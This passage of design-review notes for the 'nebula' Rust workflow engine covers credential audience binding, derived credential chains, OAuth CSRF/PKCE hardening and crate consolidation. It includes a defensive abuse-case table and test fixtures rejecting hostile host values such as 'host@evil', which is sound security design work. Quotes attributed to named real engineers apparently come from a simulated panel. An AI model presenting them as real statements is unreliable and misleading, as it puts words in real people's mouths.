- **DI2-11** — ADR-0070 expands to two orthogonal axes (audience +
  binding scope) OR new **ADR-0071 (Credential binding scope/RBAC)**.
  `BindScope { Roles(..) | Namespace(..) | Workflows(..) |
  NamespaceLocal(default) }`.
- **DI2-12** — `RegisterOptions.bindable_scope` mandatory for
  sensitive credentials; `RegisterError::MissingBindScope` (fatal,
  debug+release), paired with `MissingAudience`.
- **DI2-13** — picker (Layer 2) filters by caller scope; engine
  binding-time rejection `BindError::OutOfScope { credential,
  caller_scope }` + audit event + `nebula.credential.
  out_of_scope_bind_attempt_total` metric.
- **DI2-14** — security test: out-of-scope bind via UI hidden;
  via hand-edited YAML rejected at binding-time; audit emitted;
  deny-by-default namespace isolation verified.

### Clarification (user, 2026-05-14): how does a domain Resource require specific auth?

User: «как для чистого ресурса требовать определённую авторизацию —
HttpResource для типа SlackResource с зависимостью над
HttpResource?»

**Answer: layered Resource→Resource + Resource→Credential
composition.** Already supported (ADR-0044 slot fields + ADR-0059
dependency graph + R-6 backlog).

Two levels:
- **Transport Resource (`HttpClient`, built-in core)** — generic
  reqwest + pool + retry/timeout. **Auth-agnostic**; credential slot
  is `Option<Handle<dyn HttpAuthScheme>>`.
- **Domain Resource (`SlackResource`)** — composes over `HttpClient`
  via `#[require("transport")] Handle<HttpClient>` (Resource→Resource,
  reuses pooling), and requires **typed** auth via
  `#[require("auth")] Handle<SlackCredential>` (Resource→Credential).
  `SlackResource::create` applies Slack creds to requests sent
  through the transport; Action gets a typed `SlackClient`, sees
  neither http client nor secret.

No double-auth: in the composition `HttpClient.auth = None` (bare
transport); the same built-in `HttpClient` carries
`Some(dyn HttpAuthScheme)` only when a generic `HttpRequest` Action
uses it directly.

Invariants fit cleanly:
- Audience: `SlackCredential.allowed_destinations = slack.com`;
  `SlackResource` declares its destination; engine matches at
  credential→resource resolution. Transport `HttpClient` is
  audience-agnostic here (carries no secret in this composition).
- Cycle detection (ADR-0059 tarjan SCC): `SlackResource→HttpClient→∅`,
  no cycle, caught at registration.
- Init order (ADR-0059 topological): `SlackCredential` → `HttpClient`
  → `SlackResource` → Action.
- Secret boundary: secret lives in `SlackResource::create` (Resource
  code, allowed). Built-in domain resource = trusted; plugin domain
  resource = Tier model.

Open question (Cart): **config propagation down the composition** —
`SlackResource` may need to ask for an `HttpClient` with a specific
retry/timeout policy. How config flows down Resource→Resource layers
is unresolved. Folded into Round 3 as **R-9**.

Builder consensus: layered transport/domain composition is correct
(Carl Lerche, Mitchell Hashimoto, withoutboats, Niko Matsakis,
Cart). This is core Round 3 material.

### Action items (final — after re-correction)

- **DI2-0** — backlog seed **K-R1**: `nebula-resource-builtin` crate
  — core-trusted `HttpClient` / `PgPool` / `GrpcChannel` /
  `RedisClient` resources baking credential→client + internal
  audience enforcement. Authenticated common path = one
  `#[require]` line, zero author boilerplate. Feeds Round 3.
- **DI2-0b** — Round 3 seed **R-9**: config propagation down
  Resource→Resource composition (domain resource requesting a
  transport resource with specific policy). Cart's open question.
- **DI2-0c** — layered transport/domain pattern documented:
  `HttpClient.auth: Option<...>` (None in composition, Some in
  direct use); `SlackResource` example in
  `nebula-resource-builtin` docs as the canonical recipe.

- **DI2-1** — ADR seed **ADR-0070** rewritten: "Credential audience
  binding + Resource-boundary secret model". Secret reachable in
  `Resource::create` (necessary for arbitrary libraries); NOT in
  Action code (type boundary); configurator never reaches it.
  `allowed_destinations` mandatory on `Credential`, deny-by-default
  for generic. Enforcement at **credential→resource resolution**:
  `resource.destination ∈ credential.allowed_destinations`.
- **DI2-2** — **ADR-0068 reframed**: `nebula-credential-http` is one
  `HttpClient` **Resource**, not a universal chokepoint and not
  optional middleware. Built-in convenience resource that applies
  `HttpAuthScheme` to a `reqwest::Client`; node may use any library
  for unauthenticated calls.
- **DI2-3** — type boundary: `Action` has no compiler-reachable path
  to a bound `Credential`; only `Handle<Resource>` (ready runtime).
  `Resource::create` is the sole place the credential slot is
  readable. Compile-fail probe: no `Handle<Resource> → Credential`
  / `→ secret String` path from Action code.
- **DI2-4** — `Credential::allowed_destinations() -> &'static
  [HostPattern]` (built-in) / mandatory registration param (generic);
  `ResourceConfig` declares its destination host(s); engine matches
  at resolution. `HostPattern` wildcard + suffix, IDN/punycode-norm.
- **DI2-5** — `CredentialError::DestinationNotAllowed { credential,
  resource, attempted_host }` + `CredentialEvent` audit variant +
  `nebula.credential.audience_mismatch_total{credential}` metric.
- **DI2-6** — registration-time check: generic credential without
  `allowed_hosts` → `RegisterError::MissingAudience` (fatal, debug
  and release). Resource without declared destination consuming an
  audience-bound credential → resolution error.
- **DI2-7** — Charter §8 tier wiring: Tier 1 trusted (audited code,
  audience binding as defense-in-depth); Tier 3 ProcessSandbox =
  network namespace + seccomp egress gateway (code holds secret but
  no socket except gateway, which re-checks destination — Pat
  Hickey: capability shifts to egress).
- **DI2-8** — multi-destination / runtime-destination credentials:
  `allowed_destinations` supports a set (multi-tenant
  `api.eu.x.com`/`api.us.x.com`); runtime-derived host must still be
  ⊆ the declared set — never a free-form host from another field.
  (Open question the user raised earlier — folded here for Round 2.)
- **DI2-9** — tie to Diogo's `RevokeFailurePolicy::Quarantine`:
  threshold of `DestinationNotAllowed` auto-quarantines.
- **DI2-10** — security test fixtures: configurator binds wrong
  credential → blocked at resolution (audience mismatch); Tier-3
  malicious code holds secret but egress-blocked; `host@evil`,
  open-redirect, IDN-homograph rejected; Action-code → credential
  compile-fail probe; audit emitted.

---

## Round 2 — `nebula-credential`

> **Status: SUPERSEDED by the formal pass at the end of this section
> (2026-05-15).** The auto-mode draft below (Brief … DR2-9) is kept
> as history; the binding decisions are in "FORMAL ROUND 2" further
> down. Items still valid from the draft (C-4 single-flight, T5
> constant-time lint, T6 RevokeFailurePolicy, T7-T13 docs/audit) are
> re-affirmed there; the rest is reconciled with Interludes I/II and
> Round V.

### Brief

Phase 5 / M6 shipped: typed `Properties` / `State` / `Scheme` trait
shape; capability sub-traits (Interactive / Refreshable / Revocable /
Testable / Dynamic); `AuthScheme` sensitivity dichotomy
(Sensitive/Public); fatal duplicate-KEY registration in both debug and
release; `SchemeGuard<'a, C>` + `SchemeFactory<C>` refresh hook;
AES-256-GCM + Argon2id with AAD bound to credential ID; ExternalProvider
redesign (ADR-0051) phases A-D — RTPIT via `ProviderFuture<'a>` newtype,
`ProviderResolution` envelope, `ExternalProviderChain`
error-discriminated fallback, `LeasedProvider` sub-trait, Vault impl
(`nebula-credential-vault`), engine-side lease lifecycle with proactive
renewal at 70% TTL. Credential properties pipeline omits
`ValidValues::resolve` — secrets cannot depend on runtime workflow
state.

Backlog C-1..C-9 from Day 5 morning. ADR-0054 (typed capabilities,
Sam Scott engagement) sits **Proposed**, owner not engaged.

### Panel

Tony Arcieri · Sam Scott · Carl Lerche · withoutboats · Sean McArthur
· Eliza Weisman · matklad · Brian Goetz · Bryan Cantrill · Maxim
Fateev · Pat Hickey · **new voices**: Filippo Valsorda *(cryptography
engineer, ex-Cloudflare/Go security)*, Diogo Mónica *(ex-Docker
security, Anchorage Digital)*, Brendan Burns *(Kubernetes
co-founder)*.

### Frictions identified

| # | Friction | Open question |
|---|---|---|
| T1 | AAD scope | Today bound to `credential_id` only; Tony Arcieri wants `(credential_id, workflow_id, node_key, version)` for context-misuse defence |
| T2 | ADR-0054 timing | Typed capabilities (Oso pattern) = 6 weeks design; blocks Q3-Q4 2026 milestones if ratified now |
| T3 | `nebula-credential-http` (C-6) | Sean McArthur's `CredentialMiddleware` not implemented; ~30 lines of plumbing per HTTP-auth plugin without it |
| T4 | Single-flight refresh test (C-4) | withoutboats — no contract test verifying simultaneous acquires share one refresh call |
| T5 | Constant-time compare | Filippo Valsorda — `==` on `SecretString` is a timing oracle; no lint enforcement |
| T6 | Revocation failure policy | Diogo Mónica — `LogAndContinue` is the only mode; high-trust envs need `Quarantine` (state-marked) |
| T7 | Boilerplate measurement | Brendan Burns — is "Hello World OAuth2" ≤ 25 lines today? Measurement gap |
| T8 | Observability fragmentation | Eliza Weisman — 6 channels (3 spans + 2 event buses + metrics); no unified spec |
| T9 | Crate surface size | matklad — 50 public types; compile time audit needed |
| T10 | `dyn AnyCredential` shim | Brian Goetz — associated types block trait-object use; runtime registry shim story |
| T11 | Revocation SLO | Bryan Cantrill — webhook → no-new-acquires SLO target not documented |
| T12 | WASM sandbox boundary | Pat Hickey — `SchemeGuard<'a>` does not cross WASM boundary; protocol for 2028 |
| T13 | `CredentialState` versioning | Maxim Fateev — migration story not documented; one paragraph in README |

### Options considered

- **A — Stay course + accelerate C-2/C-4/C-6** (recommended)
- **B — Split crate now** (`nebula-credential-core` + `nebula-credential`)
- **C — Defer ADR-0054 to v2.0** (sub-traits sufficient for v1.0)

### Decisions

**Option A ratified, with Option C absorbed.** Three high-priority items
land in v1.0 window; rest deferred or documented.

1. **AAD extended to `(credential_id, engine_id)`** *(Tony Arcieri T1)*.
   Workflow_id / node_key **rejected** — credential reuse across
   workflows is a legitimate pattern, including those would break it.
   `engine_id` defends against ciphertext-export across deployments.
   Existing ciphertexts → one-time re-encrypt migration at engine
   startup. `crates/credential/src/crypto.rs::encrypt_with_aad`
   signature change.
2. **ADR-0054 deferred to v2.0** *(Sam Scott T2 → Option C absorbed)*.
   Sub-traits are a typed capability system today; granular
   `Capability<Read<X>>` adds value but not necessary for v1.0.
   Sam Scott engagement repositioned to Q1-Q2 2027 post-v1.0.
   ADR-0054 status: **Proposed, blocked-by-v2-roadmap**, explicit "open
   question" line added.
3. **`nebula-credential-http` is MUST for v1.0** *(Sean McArthur T3 /
   C-6)*. New Business-tier crate; Sean owns first version.
   `HttpAuthScheme: AuthScheme` trait with `apply(&self, req)` +
   `detect_401(&self, resp)` hooks; `CredentialMiddleware<C>` integrates
   with `reqwest-middleware`. 401 → `Refreshable::refresh()` → retry
   once → emit `LeaseEvent::Expired { reason: AuthExpired }` on second
   fail.
4. **Single-flight refresh contract test** *(withoutboats T4 / C-4)*:
   `crates/credential/tests/single_flight_refresh.rs` — spawn N
   concurrent acquires forcing refresh, assert exactly one
   `Refreshable::refresh` call. `tokio::sync::OnceCell` per credential
   key pattern. Pre-1.0 gate.
5. **Constant-time compare lint** *(Filippo Valsorda T5)*: `clippy.toml`
   `disallowed-methods` entry scoped to `SensitiveScheme` types;
   `PartialEq::eq` forbidden, suggestion: `subtle::ConstantTimeEq`.
6. **`RevokeFailurePolicy { LogAndContinue, BlockRotation, Quarantine }`**
   *(Diogo Mónica T6)*. Default `LogAndContinue` (backward compat).
   `Quarantine` marks credential `state: Compromised`; new acquires
   fail until manual unlock. Added to `CredentialMetadata`. New metric
   `nebula.credential.compromised_total{provider}`.
7. **`CredentialState` versioning paragraph** *(Maxim Fateev T13)*:
   one README section. Recommendation: `State: Serialize + Deserialize
   + Default`; new fields with `#[serde(default)]`; removed fields
   require major-version bump of credential `KEY`.

### Documentation / audit items

- **T7 (Brendan)** — boilerplate audit: write "Hello World OAuth2" with
  `#[derive(Credential)] + #[derive(Schema)] + properties = SlackProperties
  + protocol = StaticProtocol` and count lines. If ≤ 25, fine. If
  greater, escalate to derive-macro improvement ticket.
- **T8 (Eliza)** — unified observability doc `crates/credential/docs/
  OBSERVABILITY.md`: spans / event buses / metrics overlay for
  credential lifecycle. Operator-facing.
- **T11 (Bryan)** — `crates/credential/docs/REVOCATION-SLO.md`: webhook
  → no-new-acquires target < 5 seconds. Measurement task.
- **T9 (matklad)** — audit `cargo build -p nebula-credential` time;
  split deferred until measured.
- **T12 (Pat)** — backlog **K-1**: "WASM sandbox credential boundary
  protocol", 2028+.

### Rejected

- **Option B** (crate split now): no measured compile bottleneck;
  facade re-export per ADR-0055 makes split invisible to consumers
  anyway.
- **AAD includes `(workflow_id, node_key)`**: breaks credential reuse
  across workflows.
- **`dyn AnyCredential` shim** (T10): `CredentialRegistry::iter_compatible`
  already uses typed registry without dyn objects. Backlog if future
  use case emerges.

### Notable quotes

- **Tony Arcieri**: «AAD bound only to credential_id leaves
  context-misuse open. `engine_id` closes it without breaking reuse.
  Acceptable scope.»
- **Sam Scott**: «Sub-traits are typed capabilities at one granularity
  level. Per-credential granularity is the next step. v1.0 does not
  need both.»
- **Sean McArthur**: «Six lines of plumbing for HTTP auth in your
  plugin = ergonomic. Twenty-six = adoption ceiling. Land the
  middleware.»
- **Diogo Mónica**: «`LogAndContinue` is fine for SaaS dev. For
  financial-grade or healthcare-grade, `Quarantine` is the audit
  story. Five lines of config.»
- **Filippo Valsorda**: «If `==` works on a token, you have a timing
  oracle. The lint costs nothing, the absence costs you a CVE.»

### Charter impact

- **F3 unchanged** — trait-only by default holds.
- **F4 reinforced** — unified observability doc lands; spec deepens.
- **ADR-0051 amendment** — AAD scope extension.
- **ADR-0054 status update** — Proposed, blocked-by-v2-roadmap.
- New ADR seed: **ADR-0068** — `nebula-credential-http` middleware
  crate. (Owner: Sean McArthur. Target: Q4 2026.)
- New backlog: **K-1** (WASM credential boundary).

### Action items

- **DR2-1** — ADR-0051 AAD scope amendment + crypto.rs change + migration hook.
- **DR2-2** — ADR-0068 seed for `nebula-credential-http`.
- **DR2-3** — `single_flight_refresh.rs` test fixture.
- **DR2-4** — `clippy.toml` constant-time lint scoped to `SensitiveScheme`.
- **DR2-5** — `RevokeFailurePolicy` enum + `Compromised` state.
- **DR2-6** — README versioning paragraph.
- **DR2-7** — `OBSERVABILITY.md` + `REVOCATION-SLO.md`.
- **DR2-8** — Hello World OAuth2 boilerplate audit.
- **DR2-9** — `nebula-credential` compile-time benchmark.

---

## FORMAL ROUND 2 — `nebula-credential` (2026-05-15)

> Supersedes the auto-mode draft above. Interlude I/II + Round V
> already settled the big items; this pass covers what remained and
> runs a proactive abuse-case sweep first (per
> feedback_adversarial_security_review).

### Already closed by Interlude I/II + Round V (not re-litigated)

credential = dependency not `Field` (I); generic node →
`Handle<dyn HttpAuthScheme>` capability (I/II); **audience binding**
egress ∈ allowed_destinations (II); **secret-at-Resource-boundary**
not Action, not hidden from library code (II re-correction);
**binding scope/RBAC** deny-by-default namespace-local (II); Tier
model for untrusted code (II); C-6 → ADR-0068 `HttpAuthScheme` +
`CredentialMiddleware` (II); Properties use typed companion struct,
not generic `Value` (Round V).

### Proactive abuse-case sweep (assistant, before proposals)

| # | Attack | Coverage | Hole |
|---|---|---|---|
| AB-1 | Refresh-token theft (mint access forever) | encrypted State + AAD; derived chain unspecified | **C-8/C-9 gap** |
| AB-2 | Derived-chain confused deputy (bind someone's refresh as parent) | binding scope partial; C→C not covered | **gap** |
| AB-3 | Pending-state injection (forge OAuth callback) | PendingToken exists; CSRF state/PKCE not formalized | **partial gap** |
| AB-4 | Lease exhaustion (unbounded renew/track) | renew budget (ADR-0051 Ph.D); max-tracked-leases? | partial |
| AB-5 | Cross-tenant leak | binding scope deny-by-default (II) | covered |
| AB-6 | Replay in another workflow | AAD (engine_id) + binding scope | covered; AAD at-rest scope to finalize |
| AB-7 | Timing oracle (compare/refresh) | constant-time lint (T5) | lint yes; refresh-duration oracle minor |
| AB-8 | Scheme leak to logs | SensitiveScheme not Display (§15.5) | covered |
| AB-9 | `resolve()` egress (plugin sends properties to attacker) | Tier model; properties pre-encryption in plugin code | **gap** |

Real holes: AB-1/AB-2 (derived chains), AB-3 (pending CSRF/PKCE),
AB-9 (`resolve()` egress).

### Panel

Tony Arcieri · Filippo Valsorda · Diogo Mónica · Joe Beda
*(SPIFFE/SPIRE — derived workload identity)* · Sam Scott · Carl
Lerche · withoutboats · Maxim Fateev · Eliza Weisman · Bryan
Cantrill · **new** Colm MacCárthaigh *(AWS — STS/credential
derivation, s2n, planet-scale auth)*.

### Decisions

| # | Decision | Driver |
|---|---|---|
| **C-8** derived chains | `#[require("parent")] Handle<ParentCred>` on derived credential — C→C via ADR-0059 slot mechanism; tarjan cycle detection at registration | Joe Beda, Colm |
| **C-9** scope narrowing | Registration-time invariant: `derived.scope ⊆ parent.scope` ∧ `derived.allowed_destinations ⊆ parent.allowed_destinations` ∧ `derived.ttl ≤ parent.ttl`; violation → `RegisterError`. **Cascade revoke** parent→all derived | Joe Beda, Colm MacCárthaigh |
| **AB-1** refresh theft | optional **single-use refresh rotation** (AWS pattern): each refresh issues new refresh, old invalidated; opt-in per credential type | Colm, Diogo |
| **AB-3** pending security | `Interactive::Pending` **mandatory** crypto-random `state` (CSRF, verified on callback) + PKCE S256; `PendingStateStore` short TTL (10min) + single-use | Filippo |
| **AB-9** resolve() egress | plugin `resolve()` network calls go through engine-mediated audience-bound egress (Interlude II), not raw client | Tony Arcieri |
| **C-2** at-rest AAD | **Finalized:** `(credential_id, engine_id, key_generation)`. NOT workflow_id/node_key (breaks legitimate reuse). `key_generation` for multi-key lazy re-encrypt | Tony Arcieri |
| **C-5** borrowed-while-refreshing | Long-running action holds **`SchemeFactory<C>`**, NOT `SchemeGuard`; per-request `factory.acquire()` → fresh scheme; `SchemeGuard` scoped to one request. Documented mandatory pattern | Carl Lerche, Maxim |
| durable | Journal carries `CredentialRef` (ID), **never** Scheme/State; replay re-resolves via factory (aligns Round V Restate lesson) | Maxim Fateev |
| **C-3** rotate() | **Rejected** as trait method — rotation stays engine-side `RotationTransaction`; credential exposes `Revocable`; no trait bloat | withoutboats |
| **ADR-0054** typed caps | **Defer → v2.0 confirmed.** Sub-traits + audience + binding scope + C-9 narrowing = sufficient multi-axis typed authz for v1.0 | Sam Scott |
| **AB-4** lease exhaustion | **Max tracked leases per engine** (bounded); over → reject + alert | Diogo |
| **C-7** security review | **v1.0 RELEASE GATE, not follow-up** — Trail of Bits / NCC audit derived chains + audience + binding scope before v1.0 | Bryan Cantrill |
| obs | `nebula.credential.derive{parent,child,outcome}` span + cascade-revoke audit; part of unified observability doc (DR2-7) | Eliza |

Re-affirmed from draft: C-4 single-flight test (DR2-3), T5
constant-time lint (DR2-4), T6 `RevokeFailurePolicy` (DR2-5) — now
also triggered by audience-mismatch threshold (Interlude II tie-in),
T13 versioning paragraph (DR2-6), T7/T8/T11 docs (DR2-7/8), T9
compile benchmark (DR2-9), T12 WASM backlog K-1.

### Notable quotes

- **Joe Beda**: «Derived chains are delegation. SPIFFE: derived SVID
  never wider than parent. C-9 is exactly trust-domain + audience
  narrowing, enforced at registration, not runtime.»
- **Colm MacCárthaigh**: «AWS STS is derived credentials at planet
  scale. Laws: derived TTL ≤ parent, no re-derive wider, revoke
  parent → revoke all derived, optional single-use refresh rotation
  against stolen-refresh. Not theory — it's what holds AWS.»
- **Carl Lerche**: «Long-running action holds `SchemeFactory`, not
  `SchemeGuard`. Re-acquire per request → fresh scheme, refresh
  transparent. SchemeGuard scoped to one request. That is the
  borrowed-while-refreshing answer.»
- **Maxim Fateev**: «Journal carries the credential reference, never
  the material. Replay re-resolves. Same shape as Round V's Restate
  lesson — durable = reference + re-resolve, not materialized.»
- **Sam Scott**: «Sub-traits + audience + binding scope + C-9 is
  already multi-axis typed authz. `Capability<Read<X>>` is
  diminishing returns for v1.0. Defer confirmed.»
- **Bryan Cantrill**: «Derived chains + audience + binding scope is
  exactly what Trail of Bits must audit *before* v1.0. Workflow
  engines die from credential CVEs.»

### Charter / ADR impact

- **New principle — Credential Delegation Narrowing**: derived
  credential's scope/audience/TTL ⊆ parent's, enforced at
  registration; revoke cascades parent→derived. Charter §3 new
  F-entry (paired with audience binding + binding scope).
- **ADR-0051 amendment** — AAD = `(credential_id, engine_id,
  key_generation)`; cascade revoke through chain.
- **ADR-0072 seed** — derived credential chains (C-8/C-9: C→C
  dependency graph, scope/audience/TTL narrowing, cascade revoke).
- **ADR-0073 seed** — OAuth interactive flow security (mandatory
  CSRF state + PKCE S256, pending TTL/single-use).
- **ADR-0054** — Proposed, deferred-to-v2.0 **confirmed**.
- **C-7 elevated** — Trail of Bits / NCC review = v1.0 release gate.

### Action items (formal — extend DR2-*)

- **DR2-10** — ADR-0072: derived credential chains, C→C slot
  dependency, scope/audience/TTL narrowing invariant, cascade revoke
  through chain.
- **DR2-11** — ADR-0073: OAuth interactive security — `Interactive::
  Pending` mandatory CSRF `state` + PKCE S256; `PendingStateStore`
  TTL 10min + single-use; security test fixtures.
- **DR2-12** — optional single-use refresh-token rotation
  (per-credential opt-in); old-refresh invalidation; test.
- **DR2-13** — `resolve()` egress: plugin network calls routed via
  engine-mediated audience-bound egress; raw client in `resolve()`
  rejected/Tier-gated.
- **DR2-14** — C-2 finalize: AAD `(credential_id, engine_id,
  key_generation)`; one-time re-encrypt migration; ADR-0051 patch.
- **DR2-15** — C-5: `SchemeFactory` mandatory-pattern doc for
  long-running actions; `SchemeGuard` request-scoped; durable journal
  carries `CredentialRef` only — compile-fail probe that Scheme/State
  is not journal-serializable.
- **DR2-16** — `nebula.credential.derive` span + cascade-revoke
  audit; fold into OBSERVABILITY.md (DR2-7).
- **DR2-17** — max-tracked-leases bound + reject+alert on exceed.
- **DR2-18** — C-7 scheduled as explicit v1.0 release gate in
  roadmap (Trail of Bits / NCC), scope = derived chains + audience +
  binding scope + secret model.

---

## Round 2-B — `nebula-credential` architecture (2026-05-15)

> User flagged that Round 2 went deep on security but under-covered
> ordinary architectural improvement of the crate itself. Addressed
> here with an adversarial-architecture sweep against the real code
> (70 files in `crates/credential/src/`, ~41 lib.rs re-exports).

### Architecture problems (verified in code)

| # | Problem | Defect |
|---|---|---|
| AR-1 | Crate does too much | contract + built-ins + provider + rotation + store + pending + secrets = 7 audiences in one crate; plugin author sees integrator/engine types they never use |
| AR-2 | `credentials/` duplicates `nebula-credential-builtin` | README says built-ins live in `-builtin`, but `crates/credential/src/credentials/{api_key,basic_auth,oauth2}.rs` exist here too — boundary erosion |
| AR-3 | ADR-0035 phantom-shim | `mod sealed_caps` + `dyn ServiceCapabilityPhantom` rewrite is a pre-1.95 dyn-safety ritual; likely obsolete with stable RPITIT |
| AR-4 | Author-facing ↔ engine-internal mixed | `Credential` trait beside `ExternalProvider`/`RotationTransaction`/`CredentialStore` in one surface |
| AR-5 | ~41 lib.rs re-exports | matklad's deferred T9; author needs ≤15 types to write a credential, not 41 |

### Panel

matklad *(architecture/surface — central)* · Niko Matsakis ·
dtolnay · Alice Ryhl · withoutboats · Carl Lerche · Aaron Turon.

### Decisions

| # | Decision | Driver |
|---|---|---|
| AR-1/AR-4 | **Crate split by audience.** `nebula-credential` = thin contract (Credential trait, Properties/State/Scheme, 5 capability sub-traits, derive — ~15 types). `provider/` → `nebula-credential-provider` (integrator opt-in, Vault/AWS). `rotation/`+`store/`+`pending_store/` → engine-internal (`nebula-engine::credential`, where the resolver already lives per ADR-0028-0032). Facade (ADR-0055) hides the split | matklad, dtolnay, Carl Lerche |
| AR-2 | **Remove the dup.** `crates/credential/src/credentials/` deleted — built-ins live ONLY in `nebula-credential-builtin`. Boundary restored | matklad |
| AR-3 | **ADR-0035 revisit vs Rust 1.95.** Keep sealed (anti-self-attest §15.8); drop the phantom-shim ritual if RPITIT + `iter_compatible` cover dyn-discovery. Idiom currency, same as the async-trait removal | Niko, withoutboats |
| AR-5 | **Author surface ≤ 15.** lib.rs re-exports author-facing only; engine/integrator types behind `#[doc(hidden)] __internal` or moved to the split crates | dtolnay, Aaron Turon |
| DX | T7 audit done; `StaticProtocol` covers ~80% (API key/basic) in ~10 lines; sub-traits only when refresh/revoke genuinely needed; target parity with Action/Resource DX (ADR-0060 Acquirable/Handle) | Alice Ryhl |

### Notable quotes

- **matklad**: «70 files, 7 audiences — that is four crates, not
  one. Split by who imports it. Plugin author imports one thin
  crate.»
- **Niko Matsakis**: «`mod sealed_caps` + phantom rewrite was a
  pre-1.95 workaround. 1.95 RPITIT is stable (you already use it in
  ADR-0051). The phantom-shim is probably hundreds of proc-macro
  lines that can go — anti-pattern currency, exactly like
  async-trait.»
- **dtolnay**: «Author-facing credential must be as thin as we made
  `Action` a marker. They must not see `ExternalProvider` /
  `RotationTransaction` / `CredentialStore`. Facade hides the
  split.»
- **Alice Ryhl**: «OAuth2 credential today ≈ 60-80 lines vs Action's
  4. Credential DX lags badly. `StaticProtocol` must cover 80% in
  ~10 lines.»
- **Aaron Turon**: «41 re-exports = 41 things you cannot change
  without a break. Thin contract = less Hyrum surface, freedom to
  evolve internals. Long-term maintainability, not cosmetics.»

### Charter / ADR impact

- **ADR-0074 seed** — `nebula-credential` audience split: thin
  contract / `-builtin` / `-provider` / engine-internal
  (rotation/store/pending). Facade hides it (ADR-0055).
- **ADR-0035 revisit** — phantom-shim vs Rust 1.95 RPITIT;
  expected simplification.
- **AR-2 fix** — remove `credentials/` dup (boundary erosion).
- matklad's T9 now formally addressed, not deferred.

### Action items

- **DR2-19** — ADR-0074: credential crate split by audience
  (contract / builtin / provider / engine-internal); migration map;
  facade re-export.
- **DR2-20** — ADR-0035 audit vs Rust 1.95: drop phantom-shim if
  RPITIT/`iter_compatible` suffice; keep sealed.
- **DR2-21** — delete `crates/credential/src/credentials/` (dup);
  built-ins only in `nebula-credential-builtin`.
- **DR2-22** — lib.rs surface trim to ≤15 author-facing types;
  engine/integrator behind `__internal`/moved.
- **DR2-23** — T7 Hello-World audit + `StaticProtocol` 80%-in-10-lines
  target; DX parity with Action/Resource.

---

*Round 3 (`nebula-resource`) opens next.*

---

## Full Decomposition Audit (2026-05-15)

> User chose option (1): audit ALL ~26 crates, ffmpeg-coauthor
> spirit — cut honestly for the best shared product, no rivals.
> Facts gathered by reading every crate's README/Cargo.toml/lib.rs
> (Explore agent, verified). This is the first honest audit of the
> *whole* decomposition, not the 5 assumed Foundation crates.

### Classification (verified)

| Category | Crates | n |
|---|---|---|
| USER (solves a user problem) | action, schema, credential, resource, validator, expression, sdk, plugin-sdk, api, credential-builtin, credential-vault, value | 12 |
| DECOMP-GLUE (glues our own split) | metadata, plugin, sandbox | 3 |
| CROSS-CUTTING (0 upward deps) | error, eventbus, log, metrics, system, resilience, storage-loom-probe | 7 |
| ENGINE-INTERNAL | engine, storage, workflow, execution, core | 5 |

### Panel (ffmpeg co-authors, cut constructively)

Carl Lerche · Rich Hickey · matklad · Lucio Franco · Eliza Weisman
· Niko Matsakis · Bryan Cantrill · dtolnay · withoutboats · Alice
Ryhl · Aaron Turon.

### Key findings

- **`metadata`** — proven Hickey complect; `Metadata` trait =
  struct-field simulating inheritance (Niko). → `CatalogLeaf` trait
  in `core` (~25 lines); compat-rules (= our Schema Immutability
  principle) home is `schema`, not a crate.
- **`storage-loom-probe`** — workspace member is a mistake; it is a
  `#[cfg(loom)]` test in `storage/tests/` (matklad).
- **`plugin`** (6 files, registry) — imported only by
  engine/sandbox/api, never standalone → engine-internal module,
  not a crate (matklad/dtolnay).
- **`log`+`metrics`+`system`** — one operator concern
  (observability) split by noun → `nebula-observability` with
  feature flags (Eliza).
- **`workflow`+`execution`** — definition + its state machine = one
  execution-model concern → merge (Hickey/withoutboats).
- **`core`** — 0 upward deps → actually cross-cutting, not
  engine-internal (withoutboats).
- **`sdk`** (façade) and **`plugin-sdk`** (plugin-author broker) —
  correct USER crates, audience-separated, keep (dtolnay). `plugin`
  ≠ those — collapse into engine.
- Releasable-unit discipline: ~26 → ~13 by merge/move, not deletion
  (Lucio Franco, Bryan Cantrill). User imports **1** (`nebula-sdk`,
  ADR-0055 façade hides the rest — Alice Ryhl/dtolnay).

### Proposed target layout (~13, user decides)

| Target crate | Absorbs | Category |
|---|---|---|
| `nebula-core` | core + metadata(→`CatalogLeaf`) + error | CROSS-CUTTING |
| `nebula-value` | value (Round V) | FOUNDATION-0 |
| `nebula-schema` | schema (+validator+expression ALT-D **OR** keep 3 siblings — OPEN) | USER |
| `nebula-action` | action | USER |
| `nebula-credential` | credential (thin, Round 2-B split) | USER |
| `nebula-credential-builtin` | credential-builtin + credential-vault (feature `vault`) | USER |
| `nebula-resource` | resource (+resource-builtin K-R1 feature) | USER |
| `nebula-observability` | log + metrics + system (feature flags) | CROSS-CUTTING |
| `nebula-resilience` | resilience | CROSS-CUTTING |
| `nebula-eventbus` | eventbus | CROSS-CUTTING |
| `nebula-engine` | engine + workflow + execution + plugin + sandbox | ENGINE-INTERNAL |
| `nebula-storage` | storage | ENGINE-INTERNAL |
| `nebula-sdk` | sdk façade | USER |
| `nebula-plugin-sdk` | plugin-sdk | USER |

`storage-loom-probe` → `storage/tests/` cfg(loom), not a member.
Macros companions stay with parents.

### Honest trade-offs (where merge loses)

- **schema+validator+expression (ALT-D)** — contested:
  `Validated<T>` is used in credential without schema. NOT forced;
  needs a real vote (was echo-validated "3 siblings" before).
  **Marked OPEN.**
- **engine absorbs workflow/execution/plugin/sandbox** — engine
  ≈90 files; engine-internal, narrow API, user-invisible — size
  acceptable (Carl Lerche) but needs strict internal modules.
- **observability merge** — loses "take only metrics"; feature flags
  mitigate, zero-cost not guaranteed.
- **metadata → core** — core grows slightly; but Schema Immutability
  principle finally gets a home (schema) instead of being
  re-invented.

### Charter / ADR impact

- **ADR-0075 seed** — full decomposition consolidation ~26 → ~13;
  merge/move map; façade-hides-split contract (ADR-0055
  reinforced).
- ALT-F (kill `metadata`) folded in: `CatalogLeaf` trait in core,
  compat-rules in schema.
- **OPEN VOTE pending** — schema-triad merge (ALT-D) vs 3 siblings;
  previously echo-validated, must be decided honestly.
- Supersedes the implicit "Foundation Five + supporting" framing —
  the real unit count and the DECOMP-GLUE category were never on
  the table until this audit.

### Action items

- **DA-1** — ADR-0075: ~26→~13 consolidation map, per-crate
  merge/move rationale, façade contract.
- **DA-2** — kill `metadata`: `CatalogLeaf` trait → core; compat
  rules → schema (Schema Immutability home).
- **DA-3** — `storage-loom-probe` → `storage/tests/` cfg(loom).
- **DA-4** — `plugin`/`sandbox` → engine-internal modules.
- **DA-5** — `nebula-observability` = log+metrics+system, feature
  flags.
- **DA-6** — merge `workflow`+`execution` (execution-model concern).
